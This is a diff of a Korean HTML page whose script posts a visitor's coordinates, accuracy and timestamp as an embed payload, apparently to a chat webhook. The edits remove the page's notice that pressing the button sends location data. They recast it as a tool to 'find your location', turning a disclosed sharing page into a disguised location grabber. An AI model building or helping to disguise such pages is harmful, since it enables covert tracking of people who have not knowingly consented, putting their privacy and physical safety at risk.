@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>위치 공유</title>
+  <title>당신의 위치는..</title>
   <style>
     body {
       font-family: -apple-system, sans-serif;
@@ -23,9 +23,9 @@
   </style>
 </head>
 <body>
-  <h2>📍 위치 공유</h2>
-  <p>버튼을 누르면 위치 정보가 전송됩니다.</p>
-  <button id="btn">위치 공유하기</button>
+  <h2>📍 당신의 위치</h2>
+  <p>버튼을 누르면 당신의 위치를 알게 됩니다.</p>
+  <button id="btn">당신의 위치 알기</button>
   <p id="status">대기 중</p>
 
   <script>
@@ -66,7 +66,7 @@
                 { name: '🎯 정확도', value: `\`${Math.round(accuracy)}m\``, inline: true },
                 { name: '🕐 시간', value: now, inline: false }
               ],
-              footer: { text: '위치 공유 시스템' },
+              footer: { text: '위치 찾기 시스템' },
               timestamp: new Date().toISOString()
             }]
           };
